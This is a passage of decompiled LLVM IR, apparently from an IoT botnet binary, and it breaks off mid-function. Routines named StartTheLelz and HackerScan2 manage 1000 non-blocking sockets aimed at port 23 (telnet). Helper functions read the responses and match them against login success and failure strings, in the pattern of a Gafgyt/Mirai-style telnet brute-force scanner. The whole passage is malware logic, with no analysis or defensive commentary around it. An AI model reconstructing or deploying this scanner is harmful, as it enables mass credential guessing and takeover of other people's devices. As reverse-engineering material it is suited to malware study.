dec_label_pc_de80:                                ; preds = %dec_label_pc_de58
  %v13_de18 = ptrtoint i32* %stack_var_-16 to i32
  %v3_de84 = udiv i32 %arg1, 32
  %v3_de90 = mul nuw nsw i32 %v3_de84, 4
  %v2_de98 = add nsw i32 %v3_de90, -136
  %v2_de9c = add i32 %v2_de98, %v13_de18
  %v1_dea0 = inttoptr i32 %v2_de9c to i32*
  %v2_dea0 = load i32, i32* %v1_dea0, align 4
  %v1_dea8 = urem i32 %arg1, 32
  %v6_deb0 = shl i32 1, %v1_dea8
  %v2_deb4 = or i32 %v2_dea0, %v6_deb0
  store i32 %v2_deb4, i32* %v1_dea0, align 4
  %v1_ded4 = add i32 %arg1, 1
  %v2_dedc = ptrtoint i32* %stack_var_-160 to i32
  %v5_def0 = call i32 @__libc_select(i32 %v1_ded4, i32 %v2_de44, i32 0, i32 0, i32 %v2_dedc)
  %v5_defc = icmp sgt i32 %v5_def0, 0
  br i1 %v5_defc, label %dec_label_pc_df0c, label %dec_label_pc_df00

dec_label_pc_df00:                                ; preds = %dec_label_pc_de80
  br label %dec_label_pc_df2c

dec_label_pc_df0c:                                ; preds = %dec_label_pc_de80
  %v5_df20 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_df2c

dec_label_pc_df2c:                                ; preds = %dec_label_pc_df00, %dec_label_pc_df0c
  %storemerge = phi i32 [ %v5_df20, %dec_label_pc_df0c ], [ 0, %dec_label_pc_df00 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_de44, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_df2c, { 1, 0 }
  uselistorder label %dec_label_pc_de58, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_df44 = load i32, i32* @fp, align 4
  %v3_df5c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([4 x i8*]* @global_var_321d4.493 to i32))
  store i32 %v3_df44, i32* @fp, align 4
  ret i32 %v3_df5c
}

define i32 @contains_fail(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_df7c = load i32, i32* @fp, align 4
  %v3_df94 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_321b4.502 to i32))
  store i32 %v3_df7c, i32* @fp, align 4
  ret i32 %v3_df94

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_dfe0, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_dfe4, %dec_label_pc_dfe0 ]
  %v1_dfe4 = add i32 %stack_var_-24.0, 1
  %v3_dff0 = mul i32 %v1_dfe4, 4
  %v2_dffc = add i32 %v3_dff0, %arg2
  %v1_e000 = inttoptr i32 %v2_dffc to i32*
  %v2_e000 = load i32, i32* %v1_e000, align 4
  %v2_e004 = icmp eq i32 %v2_e000, 0
  br i1 %v2_e004, label %dec_label_pc_e060.preheader, label %dec_label_pc_dfe0

dec_label_pc_e060.preheader:                      ; preds = %dec_label_pc_dfe0
  %v3_e038 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_e060

dec_label_pc_e018:                                ; preds = %dec_label_pc_e060
  %v3_e01c = mul i32 %storemerge2, 4
  %v2_e028 = add i32 %v3_e01c, %arg2
  %v1_e02c = inttoptr i32 %v2_e028 to i32*
  %v2_e02c = load i32, i32* %v1_e02c, align 4
  %v4_e038 = call i32 @strcasestr(i8* %v3_e038, i32 %v2_e02c, i32 %v3_e01c)
  %v2_e040 = icmp eq i32 %v4_e038, 0
  %v1_e058 = add nuw i32 %storemerge2, 1
  br i1 %v2_e040, label %dec_label_pc_e060, label %dec_label_pc_e078

dec_label_pc_e060:                                ; preds = %dec_label_pc_e018, %dec_label_pc_e060.preheader
  %storemerge2 = phi i32 [ %v1_e058, %dec_label_pc_e018 ], [ 0, %dec_label_pc_e060.preheader ]
  %v5_e06c = icmp slt i32 %storemerge2, %v1_dfe4
  br i1 %v5_e06c, label %dec_label_pc_e018, label %dec_label_pc_e078

dec_label_pc_e078:                                ; preds = %dec_label_pc_e060, %dec_label_pc_e018
  %storemerge = phi i32 [ 1, %dec_label_pc_e018 ], [ 0, %dec_label_pc_e060 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_dfe4, { 1, 0, 2 }
}

define i32 @StartTheLelz() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e08c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e08c, i32* %ip.global-to-local, align 4
  %v3_e090 = load i32, i32* @r4, align 4
  store i32 %v3_e090, i32* %stack_var_-24, align 4
  store i32 57496, i32* %stack_var_-4, align 4
  %v19_e090 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e094 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e094, i32* @fp, align 4
  %v2_e0b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_e0b8, i32* @r4, align 4
  %v0_e0c4 = call i32 @rand_cmwc()
  %v0_e0cc = load i32, i32* @r4, align 4
  %v2_e0cc = xor i32 %v0_e0cc, %v0_e0c4
  %v1_e0d4 = call i32 @srand(i32 %v2_e0cc)
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_e0e8 = add i32 %v19_e090, -592
  %v5_e0e8 = inttoptr i32 %v4_e0e8 to i16*
  store i16 2, i16* %v5_e0e8, align 4
  %v1_e0f0 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* %r2.global-to-local, align 4
  %v3_e120 = bitcast i32* %stack_var_-608 to i8*
  %v4_e120 = call i32 @__GI_memset(i8* %v3_e120, i32 0, i32 8)
  %v1_e12c = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r2.global-to-local, align 4
  %v3_e148 = inttoptr i32 %v1_e12c to i8*
  %v4_e148 = call i32 @__GI_memset(i8* %v3_e148, i32 0, i32 1025)
  %v1_e16c = load i32, i32* @sp, align 4
  %v1_e17c = add i32 %v1_e16c, -27993
  %v3_e180 = and i32 %v1_e17c, -8
  store i32 5000, i32* %r2.global-to-local, align 4
  %v3_e1b4 = inttoptr i32 %v3_e180 to i8*
  %v4_e1b4 = call i32 @__GI_memset(i8* %v3_e1b4, i32 0, i32 5000)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e1c4

dec_label_pc_e1c4:                                ; preds = %entry, %dec_label_pc_e1c4
  %storemerge514 = phi i32 [ 0, %entry ], [ %v1_e240, %dec_label_pc_e1c4 ]
  %v2_e1d4 = mul nuw nsw i32 %storemerge514, 28
  %v2_e1d8 = add i32 %v2_e1d4, %v3_e180
  store i32 28, i32* %r2.global-to-local, align 4
  %v3_e1e8 = inttoptr i32 %v2_e1d8 to i8*
  %v4_e1e8 = call i32 @__GI_memset(i8* %v3_e1e8, i32 0, i32 28)
  %v3_e210 = add i32 %v2_e1d8, 9
  %v4_e210 = inttoptr i32 %v3_e210 to i8*
  store i8 1, i8* %v4_e210, align 1
  %v2_e230 = add i32 %v2_e1d8, 24
  %v2_e238 = inttoptr i32 %v2_e230 to i32*
  store i32 %v1_e12c, i32* %v2_e238, align 4
  %v1_e240 = add nuw nsw i32 %storemerge514, 1
  store i32 %v1_e240, i32* %r2.global-to-local, align 4
  %v5_e254 = icmp slt i32 %v1_e240, 1000
  br i1 %v5_e254, label %dec_label_pc_e1c4, label %dec_label_pc_e258.preheader

dec_label_pc_e258.preheader:                      ; preds = %dec_label_pc_e1c4
  %v2_e2e0 = add i32 %v3_e180, 8
  %v2_e5e0 = or i32 %v3_e180, 4
  %v2_e6c0 = ptrtoint i32* %stack_var_-616 to i32
  %v2_e798 = ptrtoint i32* %stack_var_-328 to i32
  %v2_e894 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e8f0 = ptrtoint i32* %stack_var_-344 to i32
  %v2_e8f4 = ptrtoint i32* %stack_var_-340 to i32
  %v2_ea5c = add i32 %v3_e180, 24
  %v2_f5c4 = add i32 %v3_e180, 16
  br label %dec_label_pc_e258

dec_label_pc_e258:                                ; preds = %dec_label_pc_f7f8, %dec_label_pc_e258.preheader
  br label %dec_label_pc_e264

dec_label_pc_e264:                                ; preds = %dec_label_pc_e258, %dec_label_pc_f7f8
  %storemerge612 = phi i32 [ 0, %dec_label_pc_e258 ], [ %v1_f7fc, %dec_label_pc_f7f8 ]
  %v3_e270 = mul i32 %storemerge612, 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e278 = mul nuw nsw i32 %storemerge612, 28
  %v2_e27c = add i32 %v2_e278, %v3_e180
  %v2_e280 = add i32 %v2_e27c, 16
  %v1_e284 = inttoptr i32 %v2_e280 to i32*
  %v2_e284 = load i32, i32* %v1_e284, align 4
  %v2_e288 = icmp eq i32 %v2_e284, 0
  br i1 %v2_e288, label %dec_label_pc_e290, label %dec_label_pc_e2c8

dec_label_pc_e290:                                ; preds = %dec_label_pc_e264
  store i32 %storemerge612, i32* @r4, align 4
  %v2_e298 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e2ac = load i32, i32* @r4, align 4
  %v3_e2b0 = mul i32 %v0_e2ac, 4
  store i32 %v3_e2b0, i32* %r2.global-to-local, align 4
  %v2_e2b8 = mul i32 %v0_e2ac, 28
  %v2_e2c0 = add i32 %v2_f5c4, %v2_e2b8
  %v2_e2c4 = inttoptr i32 %v2_e2c0 to i32*
  store i32 %v2_e298, i32* %v2_e2c4, align 4
  br label %dec_label_pc_e2c8

dec_label_pc_e2c8:                                ; preds = %dec_label_pc_e264, %dec_label_pc_e290
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e2e4 = add i32 %v2_e2e0, %v2_e278
  %v1_e2e8 = inttoptr i32 %v2_e2e4 to i8*
  %v2_e2e8 = load i8, i8* %v1_e2e8, align 4
  %v3_e2e8 = sext i8 %v2_e2e8 to i32
  switch i32 %v3_e2e8, label %dec_label_pc_f7f8 [
    i32 0, label %dec_label_pc_e318
    i32 1, label %dec_label_pc_e7ac.lr.ph
    i32 2, label %dec_label_pc_ebdc
    i32 3, label %dec_label_pc_ed60
    i32 4, label %dec_label_pc_ef18
    i32 5, label %dec_label_pc_f09c
    i32 6, label %dec_label_pc_f254
    i32 7, label %dec_label_pc_f63c
  ]

dec_label_pc_e318:                                ; preds = %dec_label_pc_e2c8
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e334 = add i32 %v2_e27c, 8
  %v1_e338 = add i32 %v2_e27c, 9
  %v2_e338 = inttoptr i32 %v1_e338 to i8*
  %v3_e338 = load i8, i8* %v2_e338, align 1
  %v7_e33c = icmp eq i8 %v3_e338, 1
  br i1 %v7_e33c, label %dec_label_pc_e344, label %dec_label_pc_e3f0

dec_label_pc_e344:                                ; preds = %dec_label_pc_e318
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e360 = add i32 %v2_e27c, 24
  %v1_e364 = inttoptr i32 %v2_e360 to i32*
  %v2_e364 = load i32, i32* %v1_e364, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v3_e390 = inttoptr i32 %v2_e27c to i8*
  %v4_e390 = call i32 @__GI_memset(i8* %v3_e390, i32 0, i32 28)
  store i32 %v2_e360, i32* %r2.global-to-local, align 4
  store i32 %v2_e364, i32* %v1_e364, align 4
  store i32 %storemerge612, i32* @r4, align 4
  %v1_e3c0 = call i32 @HackerScan2(i32 24)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e3d0 = load i32, i32* @r4, align 4
  %v3_e3d4 = mul i32 %v0_e3d0, 4
  store i32 %v3_e3d4, i32* %r2.global-to-local, align 4
  %v2_e3dc = mul i32 %v0_e3d0, 28
  %v2_e3e4 = add i32 %v2_e5e0, %v2_e3dc
  %v2_e3e8 = inttoptr i32 %v2_e3e4 to i32*
  store i32 %v1_e3c0, i32* %v2_e3e8, align 4
  br label %dec_label_pc_e57c

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e318
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v3_e410 = load i8, i8* %v2_e338, align 1
  %v2_e414 = icmp eq i8 %v3_e410, 0
  br i1 %v2_e414, label %dec_label_pc_e41c, label %dec_label_pc_e57c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e3f0
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_e440 = add i32 %v2_e27c, 11
  %v2_e440 = inttoptr i32 %v1_e440 to i8*
  %v3_e440 = load i8, i8* %v2_e440, align 1
  %v1_e444 = add i8 %v3_e440, 1
  store i8 %v1_e444, i8* %v2_e440, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_e498 = add i32 %v2_e27c, 10
  %v2_e498 = inttoptr i32 %v1_e498 to i8*
  %v3_e498 = load i8, i8* %v2_e498, align 2
  %v1_e49c = add i8 %v3_e498, 1
  store i32 %v3_e180, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_e49c, i8* %v2_e498, align 2
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v3_e4ec = load i8, i8* %v2_e440, align 1
  %v7_e4f0 = icmp eq i8 %v3_e4ec, 22
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  br i1 %v7_e4f0, label %dec_label_pc_e4f8, label %dec_label_pc_e524

dec_label_pc_e4f8:                                ; preds = %dec_label_pc_e41c
  store i32 %v2_e334, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e338, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_e524:                                ; preds = %dec_label_pc_e41c
  %v3_e544 = load i8, i8* %v2_e498, align 2
  %v7_e548 = icmp eq i8 %v3_e544, 22
  br i1 %v7_e548, label %dec_label_pc_e550, label %dec_label_pc_e57c

dec_label_pc_e550:                                ; preds = %dec_label_pc_e524
  store i32 %v2_e334, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e338, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_e57c:                                ; preds = %dec_label_pc_e524, %dec_label_pc_e3f0, %dec_label_pc_e344
  store i32 2, i32* %r2.global-to-local, align 4
  store i16 2, i16* %v5_e0e8, align 4
  %v1_e594 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_e5c4 = call i32 @__GI_memset(i8* %v3_e120, i32 0, i32 8)
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  store i32 %storemerge612, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e600 = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_e608 = load i32, i32* @r4, align 4
  %v2_e614 = mul i32 %v0_e608, 28
  %v2_e618 = add i32 %v2_e614, %v3_e180
  %v2_e61c = inttoptr i32 %v2_e618 to i32*
  store i32 %v3_e600, i32* %v2_e61c, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_e638 = inttoptr i32 %v2_e27c to i32*
  %v2_e638 = load i32, i32* %v1_e638, align 4
  %v7_e63c = icmp eq i32 %v2_e638, -1
  br i1 %v7_e63c, label %dec_label_pc_f7f8, label %dec_label_pc_e644

dec_label_pc_e644:                                ; preds = %dec_label_pc_e57c
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e65c = load i32, i32* %v1_e638, align 4
  store i32 %v2_e65c, i32* @r4, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e678 = load i32, i32* %v1_e638, align 4
  store i32 %v2_e678, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_e688 = call i32 @__libc_fcntl(i32 %v2_e678, i32 3)
  %v1_e690 = or i32 %v2_e688, 2048
  store i32 %v1_e690, i32* @r3, align 4
  %v0_e694 = load i32, i32* @r4, align 4
  store i32 %v1_e690, i32* @r2, align 4
  %v2_e6a0 = call i32 @__libc_fcntl(i32 %v0_e694, i32 4)
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e6bc = load i32, i32* %v1_e638, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e6d0 = call i32 @__libc_connect(i32 %v2_e6bc, i32 %v2_e6c0, i32 16)
  %v3_e6d8 = icmp eq i32 %v3_e6d0, -1
  br i1 %v3_e6d8, label %dec_label_pc_e6e0, label %dec_label_pc_e744

dec_label_pc_e6e0:                                ; preds = %dec_label_pc_e644
  %v0_e6e0 = call i32 @__GI___errno_location()
  %v1_e6e8 = inttoptr i32 %v0_e6e0 to i32*
  %v2_e6e8 = load i32, i32* %v1_e6e8, align 4
  %v7_e6ec = icmp eq i32 %v2_e6e8, 115
  br i1 %v7_e6ec, label %dec_label_pc_e744, label %dec_label_pc_e6f4

dec_label_pc_e6f4:                                ; preds = %dec_label_pc_e6e0
  store i32 %v3_e180, i32* @r1, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e70c = load i32, i32* %v1_e638, align 4
  %v3_e714 = call i32 @sclose(i32 %v2_e70c, i32 %v3_e180, i32 %v3_e270)
  store i32 %v2_e334, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e338, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_e744:                                ; preds = %dec_label_pc_e644, %dec_label_pc_e6e0
  %v3_e768 = inttoptr i32 %v2_e334 to i8*
  store i8 1, i8* %v3_e768, align 4
  store i32 %v2_e280, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v1_e284, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_e7ac.lr.ph:                          ; preds = %dec_label_pc_e2c8
  br label %dec_label_pc_e7ac

dec_label_pc_e7ac:                                ; preds = %dec_label_pc_e7ac.lr.ph, %dec_label_pc_e7ac
  %storemerge711 = phi i32 [ 0, %dec_label_pc_e7ac.lr.ph ], [ %v1_e7c0, %dec_label_pc_e7ac ]
  store i32 %v2_e798, i32* %r2.global-to-local, align 4
  %v5_e7b8 = mul nuw nsw i32 %storemerge711, 4
  %v6_e7b8 = add i32 %v5_e7b8, %v2_e798
  %v7_e7b8 = inttoptr i32 %v6_e7b8 to i32*
  store i32 0, i32* %v7_e7b8, align 4
  %v1_e7c0 = add nuw nsw i32 %storemerge711, 1
  %tmp43 = icmp ult i32 %v1_e7c0, 32
  br i1 %tmp43, label %dec_label_pc_e7ac, label %dec_label_pc_e7d4

dec_label_pc_e7d4:                                ; preds = %dec_label_pc_e7ac
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_e7ec = inttoptr i32 %v2_e27c to i32*
  %v2_e7ec = load i32, i32* %v1_e7ec, align 4
  %v3_e7f0 = udiv i32 %v2_e7ec, 32
  %v3_e804 = mul nuw nsw i32 %v3_e7f0, 4
  %v2_e80c = add i32 %v3_e804, %v19_e090
  store i32 %v2_e80c, i32* %r2.global-to-local, align 4
  %v2_e810 = add i32 %v2_e80c, -304
  %v1_e814 = inttoptr i32 %v2_e810 to i32*
  %v2_e814 = load i32, i32* %v1_e814, align 4
  store i32 %v2_e814, i32* %ip.global-to-local, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e830 = load i32, i32* %v1_e7ec, align 4
  %v1_e834 = urem i32 %v2_e830, 32
  %v6_e83c = shl i32 1, %v1_e834
  %v2_e840 = or i32 %v6_e83c, %v2_e814
  store i32 %v2_e840, i32* %v1_e814, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e888 = load i32, i32* %v1_e7ec, align 4
  %v1_e88c = add i32 %v2_e888, 1
  store i32 %v1_e88c, i32* %r2.global-to-local, align 4
  store i32 %v2_e798, i32* %ip.global-to-local, align 4
  %v1_e898 = load i32, i32* @sp, align 4
  %v2_e898 = inttoptr i32 %v1_e898 to i32*
  store i32 %v2_e894, i32* %v2_e898, align 4
  %v0_e89c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e798, i32* %r2.global-to-local, align 4
  %v4_e8ac = load i32, i32* %stack_var_-336, align 4
  %v5_e8ac = call i32 @__libc_select(i32 %v0_e89c, i32 0, i32 %v2_e798, i32 0, i32 %v4_e8ac)
  %v7_e8bc = icmp eq i32 %v5_e8ac, 1
  br i1 %v7_e8bc, label %dec_label_pc_e8c4, label %dec_label_pc_eaa4

dec_label_pc_e8c4:                                ; preds = %dec_label_pc_e7d4
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-344, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e8ec = load i32, i32* %v1_e7ec, align 4
  store i32 %v2_e8ec, i32* %r2.global-to-local, align 4
  store i32 %v2_e8f0, i32* %ip.global-to-local, align 4
  %v1_e8f8 = load i32, i32* @sp, align 4
  %v2_e8f8 = inttoptr i32 %v1_e8f8 to i32*
  store i32 %v2_e8f4, i32* %v2_e8f8, align 4
  %v0_e8fc = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e90c = load i32, i32* %stack_var_-344, align 4
  %v5_e90c = call i32 @getsockopt(i32 %v0_e8fc, i32 1, i32 4, i32 %v2_e8f0, i32 %v4_e90c)
  %v3_e910 = load i32, i32* %stack_var_-344, align 4
  %v2_e914 = icmp eq i32 %v3_e910, 0
  store i32 %v3_e180, i32* @r1, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e9ac = load i32, i32* %v1_e7ec, align 4
  br i1 %v2_e914, label %dec_label_pc_e994, label %dec_label_pc_e91c

dec_label_pc_e91c:                                ; preds = %dec_label_pc_e8c4
  %v3_e93c = call i32 @sclose(i32 %v2_e9ac, i32 %v3_e180, i32 %v3_e270)
  %v2_e95c = add i32 %v2_e27c, 8
  %v3_e964 = inttoptr i32 %v2_e95c to i8*
  store i8 0, i8* %v3_e964, align 4
  store i32 %v2_e95c, i32* %r2.global-to-local, align 4
  %v3_e98c = add i32 %v2_e27c, 9
  %v4_e98c = inttoptr i32 %v3_e98c to i8*
  store i8 1, i8* %v4_e98c, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_e994:                                ; preds = %dec_label_pc_e8c4
  store i32 %v2_e9ac, i32* @r4, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_e9c8 = load i32, i32* %v1_e7ec, align 4
  store i32 %v2_e9c8, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_e9d8 = call i32 @__libc_fcntl(i32 %v2_e9c8, i32 3)
  %v1_e9e0 = and i32 %v2_e9d8, -2049
  store i32 %v1_e9e0, i32* @r3, align 4
  %v0_e9e4 = load i32, i32* @r4, align 4
  store i32 %v1_e9e0, i32* @r2, align 4
  %v2_e9f0 = call i32 @__libc_fcntl(i32 %v0_e9e4, i32 4)
  store i32 0, i32* %v1_e284, align 4
  %v3_ea40 = add i32 %v2_e27c, 20
  %v4_ea40 = inttoptr i32 %v3_ea40 to i16*
  store i16 0, i16* %v4_ea40, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_ea60 = add i32 %v2_e278, %v2_ea5c
  %v1_ea64 = inttoptr i32 %v2_ea60 to i32*
  %v2_ea64 = load i32, i32* %v1_ea64, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v3_ea74 = inttoptr i32 %v2_ea64 to i8*
  %v4_ea74 = call i32 @__GI_memset(i8* %v3_ea74, i32 0, i32 1024)
  %v2_ea94 = add i32 %v2_e27c, 8
  store i32 %v2_ea94, i32* %r2.global-to-local, align 4
  %v3_ea9c = inttoptr i32 %v2_ea94 to i8*
  store i8 2, i8* %v3_ea9c, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_eaa4:                                ; preds = %dec_label_pc_e7d4
  %v3_eaa8 = icmp eq i32 %v5_e8ac, -1
  store i32 %v3_e180, i32* @r1, align 4
  br i1 %v3_eaa8, label %dec_label_pc_eab0, label %dec_label_pc_eb28

dec_label_pc_eab0:                                ; preds = %dec_label_pc_eaa4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_eac8 = load i32, i32* %v1_e7ec, align 4
  %v3_ead0 = call i32 @sclose(i32 %v2_eac8, i32 %v3_e180, i32 %v3_e270)
  %v2_eaf0 = add i32 %v2_e27c, 8
  %v3_eaf8 = inttoptr i32 %v2_eaf0 to i8*
  store i8 0, i8* %v3_eaf8, align 4
  store i32 %v2_eaf0, i32* %r2.global-to-local, align 4
  %v3_eb20 = add i32 %v2_e27c, 9
  %v4_eb20 = inttoptr i32 %v3_eb20 to i8*
  store i8 1, i8* %v4_eb20, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_eb28:                                ; preds = %dec_label_pc_eaa4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_eb48 = load i32, i32* %v1_e284, align 4
  %v1_eb4c = add i32 %v2_eb48, 6
  store i32 %v1_eb4c, i32* @r4, align 4
  %v2_eb54 = call i32 @__GI_time(i32* null)
  %v0_eb5c = load i32, i32* @r4, align 4
  %v3_eb5c = icmp ult i32 %v0_eb5c, %v2_eb54
  br i1 %v3_eb5c, label %dec_label_pc_eb64, label %dec_label_pc_f7f8

dec_label_pc_eb64:                                ; preds = %dec_label_pc_eb28
  store i32 %v3_e180, i32* @r1, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_eb7c = load i32, i32* %v1_e7ec, align 4
  %v3_eb84 = call i32 @sclose(i32 %v2_eb7c, i32 %v3_e180, i32 %v3_e270)
  %v2_eba4 = add i32 %v2_e27c, 8
  %v3_ebac = inttoptr i32 %v2_eba4 to i8*
  store i8 0, i8* %v3_ebac, align 4
  store i32 %v2_eba4, i32* %r2.global-to-local, align 4
  %v3_ebd4 = add i32 %v2_e27c, 9
  %v4_ebd4 = inttoptr i32 %v3_ebd4 to i8*
  store i8 1, i8* %v4_ebd4, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_ebdc:                                ; preds = %dec_label_pc_e2c8
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_ebf4 = inttoptr i32 %v2_e27c to i32*
  %v2_ebf4 = load i32, i32* %v1_ebf4, align 4
  store i32 %v2_ebf4, i32* %ip.global-to-local, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_ec14 = add i32 %v2_e278, %v2_ea5c
  %v1_ec18 = inttoptr i32 %v2_ec14 to i32*
  %v2_ec18 = load i32, i32* %v1_ec18, align 4
  store i32 %v2_ec18, i32* %r2.global-to-local, align 4
  %v1_ec20 = load i32, i32* @sp, align 4
  %v2_ec20 = inttoptr i32 %v1_ec20 to i32*
  store i32 ptrtoint (i32* @global_var_321a0 to i32), i32* %v2_ec20, align 4
  %v0_ec24 = load i32, i32* %ip.global-to-local, align 4
  %v4_ec30 = inttoptr i32 %v2_ec18 to i8*
  %v5_ec30 = call i32 @read_until_response(i32 %v0_ec24, i32 10, i8* %v4_ec30, i32 1024)
  %v2_ec38 = icmp eq i32 %v5_ec30, 0
  br i1 %v2_ec38, label %dec_label_pc_ecd0, label %dec_label_pc_ec40

dec_label_pc_ec40:                                ; preds = %dec_label_pc_ebdc
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_ec60 = load i32, i32* %v1_ec18, align 4
  %v3_ec68 = call i32 @contains_fail(i32 %v2_ec60, i32 %v3_e180, i32 %v3_e270)
  %v2_ec70 = icmp eq i32 %v3_ec68, 0
  %v2_ecc0 = add i32 %v2_e27c, 8
  store i32 %v2_ecc0, i32* %r2.global-to-local, align 4
  br i1 %v2_ec70, label %dec_label_pc_eca4, label %dec_label_pc_ec78

dec_label_pc_ec78:                                ; preds = %dec_label_pc_ec40
  %v3_ec9c = inttoptr i32 %v2_ecc0 to i8*
  store i8 0, i8* %v3_ec9c, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_eca4:                                ; preds = %dec_label_pc_ec40
  %v3_ecc8 = inttoptr i32 %v2_ecc0 to i8*
  store i8 3, i8* %v3_ecc8, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_ecd0:                                ; preds = %dec_label_pc_ebdc
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_ecf0 = load i32, i32* %v1_e284, align 4
  %v1_ecf4 = add i32 %v2_ecf0, 6
  store i32 %v1_ecf4, i32* @r4, align 4
  %v2_ecfc = call i32 @__GI_time(i32* null)
  %v0_ed04 = load i32, i32* @r4, align 4
  %v3_ed04 = icmp ult i32 %v0_ed04, %v2_ecfc
  br i1 %v3_ed04, label %dec_label_pc_ed0c, label %dec_label_pc_f7f8

dec_label_pc_ed0c:                                ; preds = %dec_label_pc_ecd0
  %v2_ed28 = add i32 %v2_e27c, 8
  %v3_ed30 = inttoptr i32 %v2_ed28 to i8*
